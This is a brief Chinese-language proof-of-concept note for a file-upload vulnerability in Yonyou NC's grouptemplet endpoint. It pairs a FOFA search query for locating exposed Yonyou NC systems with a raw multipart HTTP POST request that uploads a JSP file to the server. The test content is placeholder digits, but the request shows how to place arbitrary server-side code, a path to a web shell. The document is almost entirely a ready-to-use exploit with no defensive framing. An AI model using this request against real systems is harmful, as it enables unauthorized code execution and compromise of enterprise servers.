## 用友NC_grouptemplet文件上传漏洞


## fofa
```
title="YONYOU NC"
```


## poc
```
POST /uapim/upload/grouptemplet?groupid=nc&fileType=jsp&maxSize=999 HTTP/1.1
Host: 
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryEXmnamw5gVZG9KAQ
User-Agent: Mozilla/5.0 

------WebKitFormBoundaryEXmnamw5gVZG9KAQ
Content-Disposition: form-data; name="file"; filename="test.jsp"
Content-Type: application/octet-stream

111111111111111111111
------WebKitFormBoundaryEXmnamw5gVZG9KAQ--
```
